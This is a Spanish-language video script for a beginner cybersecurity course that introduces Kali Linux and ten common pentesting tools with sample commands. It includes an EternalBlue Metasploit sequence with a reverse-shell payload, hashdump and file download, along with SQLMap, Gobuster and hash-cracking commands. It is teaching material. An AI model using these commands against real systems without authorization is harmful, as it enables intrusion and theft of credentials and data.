# 🎬 Video 08: Herramientas Esenciales

**Duración:** 30 minutos
**Módulo:** Fundamentos 08
**Objetivo:** Conocer e instalar las herramientas básicas de ciberseguridad

---

## 📝 Guión

### [00:00] Intro (30 seg)

```
"Bienvenido a CDPN. En este video vamos a conocer las herramientas 
que TODO profesional de ciberseguridad debe dominar.
No se trata de conocer 100 herramientas, sino de dominar las 10 esenciales."
```

---

### [00:30] Entorno de Trabajo (3 min)

**Visual:** Captura de pantalla de Kali/Parrot

```
"Primero, ¿dónde trabajamos?

KALI LINUX — El estándar para pentesting
- Viene con 600+ herramientas preinstaladas
- Ideal para VM o instalación nativa

PARROT SECURITY — Alternativa ligera
- Más amigable para principiantes
- Incluye herramientas de privacidad

PARA BLUE TEAM:
- Ubuntu Server con herramientas de monitoreo
- SIEM como Wazuh o ELK

HOY usaremos Kali para demostrar."
```

---

### [03:30] Nmap (5 min)

**Visual:** Terminal con Nmap

```
"PRIMERA HERRAMIENTA: Nmap
El estándar para escaneo de redes y descubrimiento de servicios.

# Ping sweep - descubrir hosts
nmap -sn 192.168.1.0/24

# Escaneo completo con versiones
nmap -sV -sC -p- target.com

# Escaneo stealth (SYN)
nmap -sS -T2 target.com

# Scripts de vulnerabilidad
nmap --script=vuln target.com

# Output a archivo
nmap -oA result target.com

Nmap es tu PRIMERA herramienta en cualquier pentest."
```

---

### [08:30] Wireshark (4 min)

**Visual:** Captura de Wireshark

```
"SEGUNDA HERRAMIENTA: Wireshark
El análisis de tráfico de red definitivo.

¿Cuándo usarlo?
- Cuando necesitas ver qué está pasando en la red
- Para detectar malware que se comunica
- Para分析 tráfico sospechoso

Filtros comunes:
http.request.method == "POST"
dns.qry.name contains "evil"
tcp.port == 443
ip.src == 192.168.1.100

Y puedes exportar objetos HTTP:
File > Export Objects > HTTP"
```

---

### [12:30] Burp Suite (4 min)

**Visual:** Interfaz de Burp

```
"TERCERA HERRAMIENTA: Burp Suite
El estándar para testing web.

CONFIGURACIÓN:
1. Configura tu navegador para usar proxy: 127.0.0.1:8080
2. Instala el certificado CA de Burp
3. Activa Intercept

MÓDULOS PRINCIPALES:
- Proxy: interceptar requests
- Repeater: modificar y reenviar
- Intruder: fuzzing automático
- Scanner: vulnerabilidad scanning

BURP COMMUNITY es gratis y suficiente para empezar."
```

---

### [16:30] Metasploit (5 min)

**Visual:** Terminal con Metasploit

```
"CUARTA HERRAMIENTA: Metasploit Framework
El framework de explotación más completo del mundo.

INICIO:
msfconsole

BÚSQUEDA:
search eternalblue

USO:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker
exploit

METERPRETER:
meterpreter > getuid
meterpreter > hashdump
meterpreter > download file.txt

Metasploit es PODEROSO pero úsalo con responsabilidad."
```

---

### [21:30] Otras Herramientas (6 min)

**Visual:** Grid de herramientas

```
"Y otras herramientas esenciales:

🔹 SQLMap — SQL Injection automatizado
sqlmap -u "http://target/?id=1" --dbs

🔹 Gobuster — Directory brute-force
gobuster dir -u http://target -w wordlist.txt

🔹 John the Ripper — Cracking de hashes
john --wordlist=rockyou.txt hash.txt

🔹 Hashcat — Cracking con GPU
hashcat -m 0 hash.txt rockyou.txt

🔹 LinPEAS — Enumeración Linux
./linpeas.sh

🔹 WinPEAS — Enumeración Windows
winpeas.exe

🔹 Nikto — Web vulnerability scanner
nikto -h http://target

Cada una tiene su caso de uso específico."
```

---

### [27:30] Instalación Rápida (2 min)

**Visual:** Comandos de instalación

```
"INSTALACIÓN EN KALI:
sudo apt update && sudo apt install -y \
  nmap wireshark burp suite metasploit-framework \
  sqlmap gobuster john hashcat

EN UBUNTU:
sudo apt install nmap wireshark
# Burp Suite: descargar de portswigger.net
# Metasploit: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall"
```

---

### [29:30] Resumen (30 seg)

**Visual:** Resumen

```
"Resumimos las 10 herramientas esenciales:

1. Nmap — escaneo de redes
2. Wireshark — análisis de tráfico
3. Burp Suite — testing web
4. Metasploit — explotación
5. SQLMap — SQL injection
6. Gobuster — directory brute
7. John — cracking de hashes
8. Hashcat — cracking GPU
9. LinPEAS/WinPEAS — enumeración
10. Nikto — web scanner

Dominar estas 10 te dará una base sólida.

En el próximo video veremos Cómo Seguir este Repo.
Nos vemos."
```

---

*Script creado para CDPN — Video 08 de Fundamentos*
